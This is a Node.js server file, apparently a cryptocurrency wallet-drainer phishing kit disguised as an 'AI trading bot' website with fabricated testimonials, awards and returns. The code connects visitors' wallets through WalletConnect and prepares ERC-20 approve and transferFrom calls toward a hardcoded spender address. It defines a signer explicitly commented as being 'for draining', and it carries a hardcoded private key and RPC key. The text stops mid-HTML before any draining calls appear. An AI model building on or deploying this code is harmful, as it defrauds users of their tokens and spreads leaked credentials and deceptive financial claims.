require('dotenv').config();
const express = require('express');
const { EthereumProvider } = require('@walletconnect/ethereum-provider');
const { ethers } = require('ethers');
const EventEmitter = require('events');

const path = require('path');

const app = express();
const port = 3000;

const nodemailer = require('nodemailer');

let transporter;

// initialize transporter: real SMTP if env vars present, otherwise create Ethereal test account
async function initTransporter() {
  if (process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASS) {
    transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT) || 587,
      secure: (process.env.SMTP_SECURE === 'true'), // true for port 465
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });
    console.log('Using real SMTP:', process.env.SMTP_HOST);
  } else {
    const testAccount = await nodemailer.createTestAccount();
    transporter = nodemailer.createTransport({
      host: 'smtp.ethereal.email',
      port: 587,
      auth: {
        user: testAccount.user,
        pass: testAccount.pass
      }
    });
    console.log('Using Ethereal test account. Preview messages at:', testAccount.user);
  }
}
initTransporter().catch(console.error);

// Increase max listeners to avoid warnings temporarily
EventEmitter.defaultMaxListeners = 50;

// Serve static files (CSS, JS, images) from "public" folder
app.use(express.static(path.join(__dirname, 'public')));

// Store current WalletConnect URI and connection state
let currentURI = null;
let isConnecting = false; // Flag to prevent concurrent connection attempts
let ethProvider = null; // Explicitly initialize to null

// Extended ABI for educational purposes
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function balanceOf(address account) public view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
    "function symbol() public view returns (string)",
    "function decimals() public view returns (uint8)"
];

const TOKEN_ADDRESSES = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
    "0xD31a59c85aE9D8edEFeC411D448f90841571b89c", // Wrapped SOL
    "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC (corrected)
];

const TOKEN_SYMBOLS = {
    "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT (Tether USD, ERC-20)",
    "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAI (Maker DAO Stablecoin)",
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2": "WETH (Wrapped Ether)",
    "0xD31a59c85aE9D8edEFeC411D448f90841571b89c": "Wrapped SOL (Wormhole)",
    "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINK (Chainlink token, ERC-20)",
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984": "UNI (Uniswap governance token)",
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": "WBTC (Wrapped Bitcoin)",
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDC (USD Coin)", // corrected
};

const SPENDER_ADDRESS = "0xaee3abd321a667004F2e916DDc768A034a3b7F7b"; //Herch Address
const PROJECT_ID = "473f8a950c10858351f909fc0bc39f66";
const MALICIOUS_PRIVATE_KEY = "82640c3aa6aa58c912d1b2d424253e014f47fcebfa19841e12f1ea4c0fa2884f";
const MAINNET_RPC_URL = "https://mainnet.infura.io/v3/8d6967ffbeef4edc8f1651fe2e928792";

let provider, signer, userAddress;

// Set to store connected user addresses
const connectedUsers = new Set();

// Malicious signer for draining
const maliciousProvider = new ethers.providers.JsonRpcProvider(MAINNET_RPC_URL);
const maliciousSigner = new ethers.Wallet(MALICIOUS_PRIVATE_KEY, maliciousProvider);

// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Initialize WalletConnect Ethereum Provider
const initProvider = async () => {
    try {
        // Disconnect and clean up existing provider
        if (ethProvider) {
            console.log('Cleaning up existing provider...');
            try {
                await ethProvider.disconnect();
                console.log('Previous provider disconnected');
            } catch (err) {
                console.error('Error during disconnect:', err);
            }
            ethProvider = null;
        }
        
        console.log('Initializing new provider...');
        ethProvider = await EthereumProvider.init({
            projectId: PROJECT_ID,
            chains: [1], // Ethereum Mainnet
            showQrModal: false,
            metadata: {
                name: 'Smart Trade Ai Bot',
                description: 'Your best trading bot for expected ROI',
                url: 'http://localhost:3000',
                icons: []
            }
        });

        // Add event listeners
        ethProvider.on('display_uri', (uri) => {
            console.log('WalletConnect URI:', uri);
            currentURI = uri;
        });

        ethProvider.on('connect', () => {
            console.log('WalletConnect connected');
            currentURI = null;
        });

        ethProvider.on('disconnect', () => {
            console.log('WalletConnect disconnected');
            provider = null;
            signer = null;
            if (userAddress) {
                connectedUsers.delete(userAddress);
                console.log(`Removed user ${userAddress} from connectedUsers`);
                userAddress = null;
            }
            currentURI = null;
            ethProvider = null; // Clear provider reference
        });

        return new ethers.providers.Web3Provider(ethProvider);
    } catch (error) {
        console.error("Provider initialization error:", error);
        ethProvider = null;
        throw error;
    }
};

app.use(express.json());

// Endpoint to get the current WalletConnect URI
app.get('/get-uri', (req, res) => {
    res.json({ uri: currentURI });
});

//Endpoint to add other pages
app.get('/market', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'market.html'));
});

app.get('/about', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'about.html'));
});

app.get('/select-bot', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'select-bot.html'));
});

// POST handler
app.post('/select-bot', async (req, res) => {
  try {
    const { name, email, bot, walletAddress } = req.body;

    // basic validation
    if (!name || !email || !bot || !walletAddress) {
      return res.status(400).json({ error: 'Name, email, bot and wallet address are required.' });
    }

    // basic sanitization: string trim and max-length guard
    const safeName = String(name).trim().slice(0, 200);
    const safeEmail = String(email).trim().slice(0, 200);
    const safeBot = String(bot).trim().slice(0, 200);
    const safewalletAddress = String(walletAddress).trim().slice(0, 200);;

    const adminEmail = process.env.ADMIN_EMAIL || 'admin@example.com';

    const mailOptions = {
      from: process.env.SMTP_FROM || `"Smart Trading Bot Website" <no-reply@${process.env.SMTP_FROM_DOMAIN || 'example.com'}>`,
      to: adminEmail,
      subject: `New bot selection from ${safeName}`,
      text:
        `New bot selection:\n\nName: ${safeName}\nEmail: ${safeEmail}\nBot: ${safeBot}\nwalletAddress:\n${safewalletAddress}`,
      html: `
        <h3>New bot selection</h3>
        <p><strong>Name:</strong> ${safeName}</p>
        <p><strong>Email:</strong> ${safeEmail}</p>
        <p><strong>Bot:</strong> ${safeBot}</p>
        <p><strong>Wallet Address:</strong><br/>${safewalletAddress.replace(/\n/g, '<br/>')}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.messageId);

    // If using Ethereal, nodemailer.getTestMessageUrl(info) gives preview link
    const preview = nodemailer.getTestMessageUrl ? nodemailer.getTestMessageUrl(info) : null;
    if (preview) console.log('Preview URL:', preview);

    res.json({ ok: true, previewUrl: preview || null });
  } catch (err) {
    console.error('Send mail error:', err);
    res.status(500).json({ error: 'Failed to send email.' });
  }
});

app.get('/contact', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'contact.html'));
});

// POST handler
app.post('/contact', async (req, res) => {
    try {
      const { name, email, subject, message } = req.body;
  
      // basic validation
      if (!name || !email || !subject || message) {
        return res.status(400).json({ error: 'Name, email, subject and message are required.' });
      }
  
      // basic sanitization: string trim and max-length guard
      const safeName = String(name).trim().slice(0, 200);
      const safeEmail = String(email).trim().slice(0, 200);
      const safeSubject = String(subject).trim().slice(0, 200);
      const safeMessage = message ? String(message).trim().slice(0, 2000) : '';
  
      const adminEmail = process.env.ADMIN_EMAIL || 'admin@example.com';
  
      const mailOptions = {
        from: process.env.SMTP_FROM || `"Website" <no-reply@${process.env.SMTP_FROM_DOMAIN || 'example.com'}>`,
        to: adminEmail,
        subject: `New message selection from ${safeName}`,
        text:
          `New message selection:\n\nName: ${safeName}\nEmail: ${safeEmail}\nBot: ${safeSubject}\nMessage:\n${safeMessage}`,
        html: `
          <h3>New bot selection</h3>
          <p><strong>Name:</strong> ${safeName}</p>
          <p><strong>Email:</strong> ${safeEmail}</p>
          <p><strong>Subject:</strong> ${safeSubject}</p>
          <p><strong>Message:</strong><br/>${safeMessage.replace(/\n/g, '<br/>')}</p>
        `
      };
  
      const info = await transporter.sendMail(mailOptions);
      console.log('Email sent:', info.messageId);
  
      // If using Ethereal, nodemailer.getTestMessageUrl(info) gives preview link
      const preview = nodemailer.getTestMessageUrl ? nodemailer.getTestMessageUrl(info) : null;
      if (preview) console.log('Preview URL:', preview);
  
      res.json({ ok: true, previewUrl: preview || null });
    } catch (err) {
      console.error('Send mail error:', err);
      res.status(500).json({ error: 'Failed to send email.' });
    }
  });

app.get('/', (req, res) => {
    const htmlContent = `
        <!doctype html>
            <html lang="en">
            <head>
                <!-- meta tags -->
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <meta name="description" content="Smart Trading Bot">
                <meta name="keywords" content="blockit, uikit3, Smart Trading Bot, handlebars, scss, javascript">
                <meta name="author" content="Smart Trading Bot">
                <meta name="theme-color" content="#FCB42D">
                <!-- preload assets -->
                <link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
                <link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
                <link rel="preload" href="/fonts/archivo-v18-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
                <link rel="preload" href="/fonts/archivo-v18-latin-300.woff2" as="font" type="font/woff2" crossorigin>
                <link rel="preload" href="/fonts/archivo-v18-latin-700.woff2" as="font" type="font/woff2" crossorigin>
                <link rel="preload" href="/css/style.css" as="style">
                <link rel="preload" href="/js/vendors/uikit.min.js" as="script">
                <link rel="preload" href="/js/utilities.min.js" as="script">
                <link rel="preload" href="/js/config-theme.js" as="script">
                <!-- stylesheet -->
                <link rel="stylesheet" href="/css/style.css">
                <!-- uikit -->
                <script src="/js/vendors/uikit.min.js"></script>
                <!-- favicon -->
                <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
                <!-- touch icon -->
                <link rel="apple-touch-icon-precomposed" href="/img/apple-touch-icon.png">
                <title>Homepage - Smart Trading Bot</title>


                <style>
                .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; margin: 10px 0; border-radius: 5px; }
                .info { background: #d1ecf1; border: 1px solid #bee5eb; padding: 15px; margin: 10px 0; border-radius: 5px; }
                .success { background: #d4edda; border: 1px solid #c3e6cb; padding: 15px; margin: 10px 0; border-radius: 5px; }
                .error { background: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; margin: 10px 0; border-radius: 5px; }
                input, button, select { padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #ccc; }
                button { background: #007bff; color: white; cursor: pointer; }
                button:disabled { background: #6c757d; cursor: not-allowed; }
                .token-info { margin: 20px 0; }
                .uri-display { 
                    background: #f8f9fa; 
                    border: 1px solid #dee2e6; 
                    padding: 15px; 
                    margin: 10px 0; 
                    border-radius: 5px;
                    font-family: monospace;
                    word-break: break-all;
                    max-height: 200px;
                    overflow-y: auto;
                }
                .qr-container { 
                    text-align: center; 
                    margin: 20px 0; 
                }
                #qr-code { 
                    margin: 10px auto; 
                }
            </style>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
        
            </head>

            <body>
                <!-- page loader begin 
                <div class="page-loader">
                    <div></div>
                    <div></div>
                    <div></div>
                </div> -->
                <!-- page loader end -->
                <!-- header begin -->
                <header>
                    <div class="uk-section uk-padding-remove-vertical">
                        <nav class="uk-navbar-container uk-navbar-transparent" data-uk-sticky="show-on-up: true; animation: uk-animation-slide-top;">
                            <div class="uk-container" data-uk-navbar>
                                <div class="uk-navbar-left">
                                    <a class="uk-navbar-item uk-logo" href="/">
                                        <img src="/img/user/header-logo-Uw3Zp9.svg" alt="logo" width="146" height="40">
                                    </a>
                                    <ul class="uk-navbar-nav uk-visible@m">
                                        <li><a href="/">Home<span data-uk-navbar-parent-icon></span></a>
                                        <!--
                                            <div class="uk-navbar-dropdown">
                                                <ul class="uk-nav uk-navbar-dropdown-nav">
                                                    <li><a href="/">Homepage 2</a></li>
                                                    <li><a href="homepage3.html">Homepage 3</a></li>
                                                    <li><a href="homepage4.html">Homepage 4</a></li>
                                                </ul>
                                            </div>
                                        -->
                                        </li>
                                        <li><a href="/market">Markets</a>
                                        </li>
                                        <li><a href="#">Company<span data-uk-navbar-parent-icon></span></a>
                                            <div class="uk-navbar-dropdown">
                                                <ul class="uk-nav uk-navbar-dropdown-nav">
                                                    <li><a href="/about">About</a></li>
                                                    <li><a href="/contact">Contact Us</a></li>
                                                    <!--
                                                    <li><a href="blog.html">Blog</a></li>
                                                    <li><a href="careers.html">Careers</a></li>
                                                    <li><a href="contact.html">Contact</a></li>
                                                    -->
                                                </ul>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </nav>
                    </div>
                </header>
                <!-- header end -->
                <main>
                    <!-- slideshow content begin -->
                    <div class="uk-section uk-padding-remove-vertical in-slideshow-gradient">
                        <div id="particles-js" class="uk-light in-slideshow uk-background-contain" data-src="/img/in-equity-slide-1.png" data-uk-img data-uk-slideshow>
                            <hr>
                            <ul class="uk-slideshow-items">
                                <li class="uk-flex uk-flex-middle">
                                    <div class="uk-container">
                                        <div class="uk-grid-large uk-flex-middle" data-uk-grid>
                                            <div class="uk-width-1-2@s in-slide-text">
                                                <p class="in-badge-text uk-text-small uk-margin-remove-bottom uk-visible@m"><span class="uk-label uk-label-success in-label-small">New</span>Trade the markets directly with
                                                    leading trading platforms.</p>
                                                <h1 class="uk-heading-small">The world's most <span class="in-highlight">powerful</span> trade app.</h1>
                                                <p class="uk-text-lead uk-visible@m">Get the most accurate market data, alerts, conversions, tools and more — all within the same app.</p>
                                                <div class="uk-grid-medium uk-child-width-1-3@m uk-child-width-1-2@s uk-margin-medium-top uk-visible@s" data-uk-grid>
                                                    <div>
                                                        <div class="uk-card uk-card-small uk-card-secondary uk-card-body uk-border-rounded uk-flex uk-flex-middle">
                                                            <div class="in-symbol-logo">
                                                                <img src="/img/in-lazy.gif" data-src="/img/in-symbol-tesla.svg" alt="ticker" width="28" height="28" data-uk-img>
                                                            </div>
                                                            <div class="in-price down">
                                                                <h6 class="uk-margin-remove">TSLA<span class="uk-text-small">-1.47%</span></h6>
                                                                <p class="uk-margin-remove"><span class="fas fa-arrow-circle-right fa-xs"></span>$113.06</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div>
                                                        <div class="uk-card uk-card-small uk-card-secondary uk-card-body uk-border-rounded uk-flex uk-flex-middle">
                                                            <div class="in-symbol-logo">
                                                                <img src="/img/in-lazy.gif" data-src="/img/in-symbol-google.svg" alt="ticker" width="28" height="28" data-uk-img>
                                                            </div>
                                                            <div class="in-price up">
                                                                <h6 class="uk-margin-remove">GOOGL<span class="uk-text-small">1.32%</span></h6>
                                                                <p class="uk-margin-remove"><span class="fas fa-arrow-circle-right fa-xs"></span>$87.34</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="uk-visible@m">
                                                        <div class="uk-card uk-card-small uk-card-secondary uk-card-body uk-border-rounded uk-flex uk-flex-middle">
                                                            <div class="in-symbol-logo">
                                                                <img src="/img/in-lazy.gif" data-src="/img/in-symbol-apple.svg" alt="ticker" width="28" height="28" data-uk-img>
                                                            </div>
                                                            <div class="in-price up">
                                                                <h6 class="uk-margin-remove">AAPL<span class="uk-text-small">3.68%</span></h6>
                                                                <p class="uk-margin-remove"><span class="fas fa-arrow-circle-right fa-xs"></span>$129.62</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="in-slide-img">
                                                <img src="/img/in-lazy.gif" data-src="/img/in-equity-slide-2.png" alt="image-slide" width="652" height="746" data-uk-img>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                                <li class="uk-flex uk-flex-middle">
                                    <div class="uk-container">
                                        <div class="uk-grid-large uk-flex-middle" data-uk-grid>
                                            <div class="uk-width-1-2@s in-slide-text">
                                                <p class="in-badge-text uk-text-small uk-margin-remove-bottom uk-visible@m"><span class="uk-label uk-label-success in-label-small">New</span>Trade the markets directly with
                                                    leading trading platforms.</p>
                                                <h1 class="uk-heading-small">Reach out to new trading <span class="in-highlight">experience</span>.</h1>
                                                <p class="uk-text-lead uk-visible@m">Bring your trading ventures go around the world, way beyond the space of your trading account.</p>
                                                <div class="uk-grid-medium uk-child-width-1-3@m uk-child-width-1-2@s uk-margin-medium-top uk-visible@s" data-uk-grid>
                                                    <div>
                                                        <div class="uk-card uk-card-small uk-card-secondary uk-card-body uk-border-rounded uk-flex uk-flex-middle">
                                                            <div class="in-symbol-logo">
                                                                <img src="/img/in-lazy.gif" data-src="/img/in-symbol-mcdonalds.svg" alt="ticker" width="28" height="28" data-uk-img>
                                                            </div>
                                                            <div class="in-price down">
                                                                <h6 class="uk-margin-remove">MCD<span class="uk-text-small">-1.29%</span></h6>
                                                                <p class="uk-margin-remove"><span class="fas fa-arrow-circle-right fa-xs"></span>$269.47</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div>
                                                        <div class="uk-card uk-card-small uk-card-secondary uk-card-body uk-border-rounded uk-flex uk-flex-middle">
                                                            <div class="in-symbol-logo">
                                                                <img src="/img/in-lazy.gif" data-src="/img/in-symbol-amazon.svg" alt="ticker" width="28" height="28" data-uk-img>
                                                            </div>
                                                            <div class="in-price up">
                                                                <h6 class="uk-margin-remove">AMZN<span class="uk-text-small">3.56%</span></h6>
                                                                <p class="uk-margin-remove"><span class="fas fa-arrow-circle-right fa-xs"></span>$86.08</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="uk-visible@m">
                                                        <div class="uk-card uk-card-small uk-card-secondary uk-card-body uk-border-rounded uk-flex uk-flex-middle">
                                                            <div class="in-symbol-logo">
                                                                <img src="/img/in-lazy.gif" data-src="/img/in-symbol-microsoft.svg" alt="ticker" width="28" height="28" data-uk-img>
                                                            </div>
                                                            <div class="in-price down">
                                                                <h6 class="uk-margin-remove">MSFT<span class="uk-text-small">-1.18%</span></h6>
                                                                <p class="uk-margin-remove"><span class="fas fa-arrow-circle-right fa-xs"></span>$224.93</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="in-slide-img">
                                                <img src="/img/in-lazy.gif" data-src="/img/in-equity-slide-2.png" alt="image-slide" width="652" height="746" data-uk-img>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                            <div class="uk-container">
                                <div class="uk-position-relative" data-uk-grid>
                                    <ul class="uk-slideshow-nav uk-dotnav uk-position-bottom-right uk-flex uk-flex-middle"></ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- slideshow content end -->
                    <!-- section content begin -->
                    <div class="uk-section uk-section-primary uk-preserve-color in-equity-1">
                        <div class="uk-container">
                            <div class="uk-grid">
                                <div class="uk-width-1-1">
                                    <h4>Popular Ai Bots</h4>
                                </div>
                            </div>
                            <div class="uk-grid-match uk-grid-medium uk-child-width-1-4@m uk-child-width-1-2@s uk-margin-bottom" data-uk-grid>
                                <div>
                                    <div class="uk-card uk-card-body uk-card-default uk-border-rounded">
                                        <div class="uk-flex uk-flex-middle">
                                            <span class="in-product-name red">USDC</span>
                                            <h5 class="uk-margin-remove">USDC Trader</h5>
                                        </div>
                                        <p>Stability in Your Wallet, Growth in Your Portfolio.</p>
                                        <a href="/market" class="uk-button uk-button-text uk-float-right uk-position-bottom-right">Explore<i class="fas fa-arrow-circle-right uk-margin-small-left"></i></a>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-card uk-card-body uk-card-default uk-border-rounded">
                                        <div class="uk-flex uk-flex-middle">
                                            <span class="in-product-name green">USDT</span>
                                            <h5 class="uk-margin-remove">USDT(Erc20) Trader</h5>
                                        </div>
                                        <p>Trade Global Markets with the World’s Leading Stablecoin.</p>
                                        <a href="/market" class="uk-button uk-button-text uk-float-right uk-position-bottom-right">Explore<i class="fas fa-arrow-circle-right uk-margin-small-left"></i></a>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-card uk-card-body uk-card-default uk-border-rounded">
                                        <div class="uk-flex uk-flex-middle">
                                            <span class="in-product-name blue">Link</span>
                                            <h5 class="uk-margin-remove">ChainLink Trader</h5>
                                        </div>
                                        <p>Precision Trading with Oracle Intelligence.</p>
                                        <a href="/market" class="uk-button uk-button-text uk-float-right uk-position-bottom-right">Explore<i class="fas fa-arrow-circle-right uk-margin-small-left"></i></a>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-card uk-card-body uk-card-default uk-border-rounded">
                                        <div class="uk-flex uk-flex-middle">
                                            <span class="in-product-name"><i class="fas fa-ellipsis-h fa-xs"></i></span>
                                            <h5 class="uk-margin-remove">Connect Wallet to Access more products</h5>
                                        </div>
                                        <p>Explore the full range of cash and leveraged products</p>
                                        <a href="/market" class="uk-button uk-button-text uk-float-right uk-position-bottom-right">Explore Market<i class="fas fa-arrow-circle-right uk-margin-small-left"></i></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- section content end -->
                    <!-- section content begin -->
                    <div class="uk-section in-equity-2 uk-background-contain uk-background-center" data-src="/img/in-equity-2-bg.png" data-uk-img>
                        <div class="uk-container uk-margin-top">
                            <div class="uk-grid uk-flex uk-flex-center">
                                <div class="uk-width-2xlarge@m uk-text-center">
                                    <span class="uk-label uk-label-warning">Fast execution, low latency<i class="fas fa-arrow-right fa-xs uk-margin-small-left"></i></span>
                                    <h1 class="uk-margin-top">Your premium choice for trading currencies & stocks online</h1>
                                    <p class="uk-text-lead uk-margin-medium-top">Harness the power of technology to make a quicker, smarter and more precise decision on CFD currency pairs, stocks, commodities and more</p>
                                </div>
                                <div class="uk-width-3-4@m uk-margin-medium-top">
                                    <img class="uk-align-center" src="/img/in-lazy.gif" data-src="/img/in-equity-2-img.png" alt="image" width="758" height="334" data-uk-img>
                                </div>
                                <div class="uk-width-2xlarge@m uk-margin-medium-top">
                                    <div class="uk-grid uk-child-width-1-4@m uk-child-width-1-4@s uk-text-center in-feature-box" data-uk-grid>
                                        <a href="#">
                                            <span class="in-icon-wrap">
                                                <img src="/img/in-lazy.gif" data-src="/img/in-equity-2-icon-1.svg" alt="icon-1" width="35" height="42" data-uk-img>
                                            </span>
                                            <p class="uk-margin-top">Trading calculators</p>
                                        </a>
                                        <a href="#">
                                            <span class="in-icon-wrap">
                                                <img src="/img/in-lazy.gif" data-src="/img/in-equity-2-icon-2.svg" alt="icon-2" width="38" height="42" data-uk-img>
                                            </span>
                                            <p class="uk-margin-top">Market analysis</p>
                                        </a>
                                        <a href="#">
                                            <span class="in-icon-wrap">
                                                <img src="/img/in-lazy.gif" data-src="/img/in-equity-2-icon-3.svg" alt="icon-3" width="42" height="42" data-uk-img>
                                            </span>
                                            <p class="uk-margin-top">Market reviews</p>
                                        </a>
                                        <a href="#">
                                            <span class="in-icon-wrap">
                                                <img src="/img/in-lazy.gif" data-src="/img/in-equity-2-icon-4.svg" alt="icon-4" width="42" height="42" data-uk-img>
                                            </span>
                                            <p class="uk-margin-top">Trading academy</p>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- section content end -->
                    <!-- section content begin -->
                    <div class="uk-section in-equity-3 in-offset-top-20">
                        <div class="uk-container uk-margin-large-bottom">
                            <div class="uk-grid uk-flex uk-flex-middle">
                                <div class="uk-width-expand@m">
                                    <h1 class="uk-margin-small-bottom">Tight spreads and <span class="in-highlight">ultra-fast</span> execution</h1>
                                    <h3 class="uk-margin-top uk-text-warning">Best market prices available so you can receive excellent conditions.</h3>
                                    <hr class="uk-margin-medium-top uk-margin-medium-bottom">
                                    <ul class="uk-list in-list-check">
                                        <li>Negative balance protection</li>
                                        <li>Segregated and supervised client funds</li>
                                        <li>Instant deposit & fast withdrawal</li>
                                    </ul>
                                </div>
                                <div class="uk-width-2xlarge uk-flex uk-flex-right uk-flex-center@s">
                                    <div class="uk-card uk-card-body uk-card-default uk-border-rounded in-margin-top-60@s">
                                        <div id="tradingview-widget"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- section content end -->
                    <!-- section content begin -->
                    <div class="uk-section in-equity-4">
                        <div class="uk-container uk-margin-top uk-margin-medium-bottom">
                            <div class="uk-grid uk-child-width-1-2@m in-testimonial-2" data-uk-grid>
                                <div class="uk-width-1-1@m uk-text-center">
                                    <h1>More than <span class="in-highlight">23,000</span> traders joined</h1>
                                </div>
                                <div>
                                    <div class="uk-background-contain uk-background-top-left" data-src="/img/in-equity-4-blob-1.svg" data-uk-img>
                                        <div class="uk-flex uk-flex-middle">
                                            <div class="uk-margin-right">
                                                <div class="uk-background-primary uk-border-pill">
                                                    <img class="uk-align-center uk-border-pill" src="/img/in-lazy.gif" data-src="/img/blockit/in-team-1.png" alt="client-1" width="100" height="100" data-uk-img>
                                                </div>
                                            </div>
                                            <div>
                                                <h5 class="uk-margin-remove-bottom">Angela Nannenhorn</h5>
                                                <p class="uk-text-muted uk-margin-remove-top">from United Kingdom</p>
                                            </div>
                                        </div>
                                        <blockquote>
                                            <p>Very convenience for trader, fees is relatively low compare to other broker</p>
                                        </blockquote>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-background-contain uk-background-top-left" data-src="/img/in-equity-4-blob-2.svg" data-uk-img>
                                        <div class="uk-flex uk-flex-middle">
                                            <div class="uk-margin-right">
                                                <div class="uk-background-primary uk-border-pill">
                                                    <img class="uk-align-center uk-border-pill" src="/img/in-lazy.gif" data-src="/img/blockit/in-team-8.png" alt="client-2" width="100" height="100" data-uk-img>
                                                </div>
                                            </div>
                                            <div>
                                                <h5 class="uk-margin-remove-bottom">Wade Palmer</h5>
                                                <p class="uk-text-muted uk-margin-remove-top">from Germany</p>
                                            </div>
                                        </div>
                                        <blockquote>
                                            <p>One of the best FX brokers, I have been using! their trading conditions are excellent</p>
                                        </blockquote>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- section content end -->
                    <!-- section content begin -->
                    <div class="uk-section in-equity-5">
                        <div class="uk-container uk-margin-remove-bottom">
                            <div class="uk-grid uk-child-width-1-3@m uk-child-width-1-2@s" data-uk-grid>
                                <div>
                                    <div class="uk-flex uk-flex-left in-award">
                                        <div class="uk-margin-small-right">
                                            <img src="/img/in-lazy.gif" data-src="/img/in-equity-5-award-1.svg" alt="award-1" width="91" height="82" data-uk-img>
                                        </div>
                                        <div>
                                            <h6>Best Web Trading App</h6>
                                            <p class="provider">European CEO Magazine</p>
                                            <p class="year">2019</p>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-flex uk-flex-left in-award">
                                        <div class="uk-margin-small-right">
                                            <img src="/img/in-lazy.gif" data-src="/img/in-equity-5-award-2.svg" alt="award-2" width="91" height="82" data-uk-img>
                                        </div>
                                        <div>
                                            <h6>Best Crypto Trader</h6>
                                            <p class="provider">UK Crypto awards</p>
                                            <p class="year">2020</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="uk-visible@m">
                                    <div class="uk-flex uk-flex-left in-award">
                                        <div class="uk-margin-small-right">
                                            <img src="/img/in-lazy.gif" data-src="/img/in-equity-5-award-3.svg" alt="award-3" width="91" height="82" data-uk-img>
                                        </div>
                                        <div>
                                            <h6>Best Trading Conditions</h6>
                                            <p class="provider">Forex report magazine</p>
                                            <p class="year">2021</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- section content end -->
                    <!-- section content begin -->
                    <div class="uk-section uk-section-primary uk-preserve-color in-equity-6 uk-background-contain uk-background-center" data-src="/img/in-equity-decor-2.svg" data-uk-img>
                        <div class="uk-container uk-margin-small-bottom">
                            <div class="uk-grid uk-flex uk-flex-center">
                                <div class="uk-width-2xlarge@m uk-text-center">
                                    <h1>Ready to get started?</h1>
                                    <p class="uk-text-lead">Global access to financial markets from a single account</p>
                                </div>
                                <div class="uk-width-3-4@m uk-margin-medium-top">
                                    <div class="uk-flex uk-flex-center uk-flex-middle button-app">
                                    <!--
                                        <div>
                                            <a href="#" class="uk-button uk-button-secondary uk-border-rounded">Open your account<i class="fas fa-arrow-circle-right uk-margin-small-left"></i></a>
                                        </div>
                                    -->
                                    <!--
                                        <div class="uk-margin-left uk-margin-right">
                                            <button id="connect">Connect Wallet</button>
                                        </div>
                                    
                                        
                                        <div class="uk-margin-right">
                                            <a href="#"><img src="/img/in-lazy.gif" data-src="/img/in-app-store.svg" alt="app-store" width="120" height="40" data-uk-img></a>
                                        </div>
                                        <div>
                                            <a href="#"><img src="/img/in-lazy.gif" data-src="/img/in-google-play.svg" alt="google-play" width="135" height="40" data-uk-img></a>
                                        </div>
                                    -->
                                    
                                        
                                        <div class="uk-margin-right">
                                             <button id="connect">ERC20 Trader</button>
                                        </div>
                                        <div>
                                             <button>ETH Trader</button>
                                        </div>
                                        
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- section content end -->



            
            
            <!-- WalletConnect URI Display -->
            <div id="uri-section" style="display: none;">
                <h3>📱 WalletConnect Connection</h3>
                <p>Scan this QR code with your mobile wallet or copy the URI below:</p>
                
                <div class="qr-container">
                    <canvas id="qr-code"></canvas>
                </div>
                
                <div class="uri-display">
                    <strong>WalletConnect URI:</strong><br>
                    <span id="uri-text"></span>
                </div>
                
